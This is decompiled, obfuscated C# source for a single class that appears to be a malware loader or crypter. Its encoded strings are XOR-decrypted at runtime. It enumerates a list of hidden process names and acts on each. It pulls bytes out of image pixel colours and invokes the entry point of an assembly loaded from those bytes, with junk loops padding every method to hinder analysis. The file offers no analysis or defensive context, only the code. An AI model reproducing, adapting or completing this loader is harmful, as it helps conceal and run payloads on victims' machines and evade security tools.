using System;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;
using SmartAssembly.Attributes;
using ns2;

namespace ns1;

internal sealed class Class1
{
	[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 1398)]
	private struct Struct1
	{
	}

	private static readonly char[] char_0;

	private static readonly char[] char_1;

	private static readonly string[] string_0;

	internal static byte byte_0/* Not supported: data(00) */;

	private static bool bool_0;

	static string smethod_0(bool bool_1, string string_1, string string_2)
	{
		sbyte b = 6;
		checked
		{
			do
			{
				double num = 20.0;
				do
				{
					float num2 = 2f;
					do
					{
						num2 += 1f;
					}
					while (num2 <= 74f);
					num += 1.0;
				}
				while (!(num > 63.0));
				b = (sbyte)unchecked(b + 1);
			}
			while (b <= 100);
			uint num3 = 4u;
			do
			{
				num3++;
			}
			while (num3 <= 117);
			return Encoding.UTF8.GetString(Class1.smethod_5((ushort)20778, 32107.39, Class2.smethod_3(string_2, 975, 1023)));
		}
	}

	[DllImport("kernel32.dll")]
	static extern IntPtr GetProcAddress(IntPtr intptr_0, string string_1);

	static void smethod_1()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		Process process_ = default(Process);
		int num5 = default(int);
		string[] array2 = default(string[]);
		int num6 = default(int);
		Process[] array3 = default(Process[]);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text;
				char[] array;
				string string_;
				string string_2;
				switch (try0000_dispatch)
				{
				default:
					Class2.smethod_5(390, 435);
					num3 = -2;
					goto IL_0012;
				case 190:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							default:
								goto end_IL_0000;
							case 0:
								goto end_IL_0000;
							case 1:
								break;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0012;
						case 3:
							goto IL_0064;
						case 5:
							goto IL_0072;
						case 6:
							goto IL_0085;
						case 7:
							goto IL_008f;
						case 4:
							goto IL_009d;
						default:
							goto end_IL_0000;
						case 8:
							goto IL_0129;
						}
						goto default;
					}
					IL_0072:
					num = 5;
					PoweredByAttribute.smethod_2(process_, 122, 121);
					num5 = checked(num5 + 1);
					goto IL_0085;
					IL_0085:
					num = 6;
					goto IL_0087;
					IL_0012:
					num = 2;
					string_ = "*S9)}~Q2!";
					string_2 = "EacZXKxQxVait1o4jTZEp3jnXICFVRGoNXChddRaj4NKEag9Wb91xFq2jFEiqCNZp2DSUI7EaBKoIXWYccpekJ1rMokbXrBm5w==";
					text = Class1.smethod_0(bool_1: false, string_, string_2);
					array = new char[1];
					string_ = ",Q@";
					string_2 = "EQ==";
					array[0] = PoweredByAttribute.Class7.smethod_1(Class1.smethod_0(bool_1: false, string_, string_2), 57, 69);
					array2 = Class2.smethod_4(text, array, 422, 497);
					goto IL_0064;
					IL_0064:
					num = 3;
					num6 = 0;
					goto IL_009d;
					IL_009d:
					num = 4;
					array3 = PoweredByAttribute.smethod_1(array2[num6], 337, 303);
					num5 = 0;
					goto IL_0087;
					IL_0087:
					if (num5 < array3.Length)
					{
						process_ = array3[num5];
						goto IL_0072;
					}
					goto IL_008f;
					IL_008f:
					num = 7;
					num6 = checked(num6 + 1);
					if (num6 <= 11)
					{
						goto IL_009d;
					}
					goto IL_0129;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 190;
				continue;
			}
			break;
			IL_0129:
			if (num2 != 0)
			{
				ProjectData.ClearProjectError();
			}
			return;
		}
		throw ProjectData.CreateProjectError(-2146828237);
	}

	static byte[] smethod_2(int int_0)
	{
		long num = 10L;
		checked
		{
			do
			{
				num++;
			}
			while (num <= 104L);
			string string_ = "Z 0";
			int i = 0;
			for (int num2 = PoweredByAttribute.Class7.smethod_0(string_, 220, 230); i < num2; i++)
			{
				smethod_6(string_, i, 370, 300);
			}
			Color color_ = PoweredByAttribute.Class7.smethod_8(int_0, 457, 499);
			return new byte[4]
			{
				smethod_8(ref color_, 133, 136),
				smethod_8(ref color_, 367, 353),
				color_.R,
				color_.A
			};
		}
	}

	[DllImport("kernel32.dll")]
	static extern IntPtr GetModuleHandle(string string_1);

	static int smethod_3(int int_0, byte[] byte_1)
	{
		short num = 9;
		checked
		{
			do
			{
				num = (short)unchecked(num + 1);
			}
			while (num <= 21);
			ushort num2 = 8;
			do
			{
				decimal num3 = new decimal(9L);
				decimal num4 = new decimal(94L);
				decimal num5 = num3;
				while (ForLoopControl.ForNextCheckDec(num5, num4, 1m))
				{
					num5 = decimal.Add(num5, 1m);
				}
				smethod_7(936, 964);
				num2 = (ushort)unchecked((uint)(num2 + 1));
			}
			while (unchecked((uint)num2) <= 87u);
			return Color.FromArgb(byte_1[int_0 + 3], byte_1[int_0 + 2], byte_1[int_0 + 1], byte_1[int_0]).ToArgb();
		}
	}

	static void smethod_4(object object_0)
	{
		sbyte b = 18;
		checked
		{
			do
			{
				float num = 1f;
				do
				{
					num += 1f;
				}
				while (num <= 85f);
				b = (sbyte)unchecked(b + 1);
			}
			while (b <= 95);
			MethodInfo methodInfo = smethod_9(PoweredByAttribute.smethod_5((byte[])object_0, 405, 466), 458, 489);
			if (methodInfo.GetParameters().Length == 0)
			{
				smethod_10(methodInfo, null, null, 613, 613);
				return;
			}
			methodInfo.Invoke(null, new object[1] { new string[0] });
		}
	}

	static byte[] smethod_5(ushort ushort_0, double double_0, byte[] byte_1)
	{
		string string_ = ",\\9";
		int i = 0;
		checked
		{
			for (int num = PoweredByAttribute.Class7.smethod_0(string_, 180, 142); i < num; i++)
			{
				smethod_6(string_, i, 46, 112);
			}
			byte[] array = new byte[11]
			{
				81, 232, 117, 48, 213, 20, 167, 49, 226, 228,
				56
			};
			int num2 = array.Length;
			int num3 = byte_1.Length - 1;
			for (int j = 0; j <= num3; j++)
			{
				byte_1[j] = unchecked((byte)(byte_1[j] ^ array[j % num2]));
			}
			return byte_1;
		}
	}

	static Class1()
	{
		smethod_11();
		char_1 = new char[699];
		char[] array = new char[8];
		array[7] = '㉐';
		array[4] = '▏';
		array[3] = 'ᬙ';
		array[5] = 'ዷ';
		array[6] = '㱚';
		array[1] = '௱';
		array[2] = 'ᇒ';
		array[0] = 'ᩆ';
		string_0 = new string[35];
		char_0 = array;
	}

	internal static char smethod_6(string string_1, int int_0, int int_1, int int_2)
	{
		while (true)
		{
			switch (int_2 ^ int_1)
			{
			case 94:
				return string_1[int_0];
			}
		}
	}

	internal static DateTime smethod_7(int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 108:
				return DateTime.Now;
			}
		}
	}

	internal static byte smethod_8(ref Color color_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 13:
				return color_0.B;
			case 14:
				return color_0.G;
			}
		}
	}

	internal static MethodInfo smethod_9(Assembly assembly_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 35:
				return assembly_0.EntryPoint;
			}
		}
	}

	internal static object smethod_10(MethodBase methodBase_0, object object_0, object[] object_1, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 0:
				return methodBase_0.Invoke(object_0, object_1);
			}
		}
	}

	internal static void smethod_11()
	{
		if (bool_0)
		{
			return;
		}
		lock (typeof(Class1))
		{
			if (!bool_0)
			{
				bool_0 = true;
				AppDomain.CurrentDomain.ResourceResolve += Class2.smethod_1;
			}
		}
	}
}
